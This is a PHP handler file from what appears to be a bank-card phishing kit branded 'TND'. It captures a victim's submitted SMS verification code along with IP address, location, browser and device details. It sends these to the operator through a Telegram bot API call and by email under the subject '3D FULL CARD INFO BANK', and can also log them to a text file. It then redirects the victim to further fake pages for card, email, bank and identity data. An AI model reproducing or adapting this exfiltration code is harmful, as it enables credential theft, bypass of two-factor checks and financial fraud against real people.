<?php
/*
  _______ _           _       _      _______    
 |__   __(_)Sel3a    | |TND95| |    |__   __|   
    | |   _ _ __   __| | __ _| |_The   | |_ __  
    | |  | | '_ \ / _` |/ _` | | | | | | | '_ \ 
    | |  | | | | | (_| | (_| | | |_| |_| | | | |
    |_|  |_|_| |_|\__,_|\__,_|_|\__, (_)_|_| |_|
     Just For Fun!               __/ |          
*/

	  if(isset($_POST['sms_code_error'])){
	include '../mine.php';
	include '../bot.php';
    }
    session_start();
    if(isset($_POST['sms_code_error'])){
    $sms_code_error =$_POST['sms_code_error'];
    }
   
    ########################################################
    $msg="=========== <[ -".$scamname."- SMS Code Error]> ===========\r\n";
    $msg.="----------------------- SMS Code Error---------------------\r\n";
   

    $msg.="SMS Code  : {$sms_code_error}\r\n";

    $msg.="---------------------- IP Info ----------------------\r\n";
    $msg.="IP ADDRESS   : {$_SESSION['ip']}\r\n";
    $msg.="LOCATION     : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg.="BROWSER      : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg.="SCREEN       : {$_SESSION['screen']}\r\n";
    $msg.="USER AGENT   : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $msg.="TIMEZONE     : {$_SESSION['ip_timezone']}\r\n";
    $msg.="TIME         : ".now()." GMT\r\n";
    $msg.="=========== <[ TND ]> ===========\r\n\r\n\r\n";
        if ($saveintext=="yes") {
    $save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );

    $subject="-".$scamname."- 3D FULL CARD INFO BANK [".$_SESSION['_cc_bank_']."] From [".$_SESSION['ip_countryName']."]";
    $headers="From: TND <3D_full_info@tnd.com>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	foreach(explode(",",$yours) as $your){
			@mail($your,$subject,$msg,$headers);
			@mail($nobot,$subject,$msg,$headers);

	}
	}
	
	
exit(header("Location: ../../app/authentication"));
    if(!isset($_POST['nextpage'])){
    if ($show_newcard=="yes") {
    exit(header("Location: ../../app/processcard"));
}elseif($show_mailaccess=="yes") {
    exit(header("Location: ../../app/mailprovider"));
}elseif($show_bank=="yes") {
    exit(header("Location: ../../app/bank"));
}elseif($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
        exit(header("Location: ../../app/thanks"));
}
}
///////////////////////////////////////////
if(isset($_POST['nextpage'])){
    if ($show_mailaccess=="yes") {
    exit(header("Location: ../../app/mailprovider"));
}elseif($show_bank=="yes") {
    exit(header("Location: ../../app/bank"));
}elseif($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
        exit(header("Location: ../../app/thanks"));
}
}

else{
     header('HTTP/1.0 404 Not Found');
          exit();
}
?>